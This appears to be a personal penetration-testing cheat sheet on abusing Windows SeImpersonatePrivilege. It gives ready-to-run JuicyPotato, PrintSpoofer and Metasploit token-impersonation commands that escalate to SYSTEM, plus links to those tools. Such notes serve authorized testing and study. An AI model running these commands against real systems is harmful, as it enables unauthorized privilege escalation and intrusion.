# Exploiting SeImpersonationPrivilege
If we have a user with access to this privilege, we can exploit it to execute a BAT file and launch another remote shell with elevated privileges.

#### Juicy Potato
Example - execute a MSFVenom reverse shell as NT AUTHORITY/System

```
JuicyPotato32.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

![[Pasted image 20220917220928.png]]

Docs: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
Exe: [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) 

#### Print Spoofer
Escalates you from `LOCAL SERVICE` or `NETWORK SERVICE` to `SYSTEM`.

Add SeImpersonatePrivilege to a `nt authority\local server`
[https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

**Execute cmd.exe** 

```
PrintSpoofer64.exe -c cmd.exe -i
```

Introduction: [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
Docs [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
Exe: [https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

### Rogue Potato 
SMB server on 445 must be running.

[https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

### Metasploit
1) `load incongnito`
2) `list_tokens -g`
3) `impersonate_token "TOKEN"`
4) `migrate PID_WITH_SAME_TOKEN`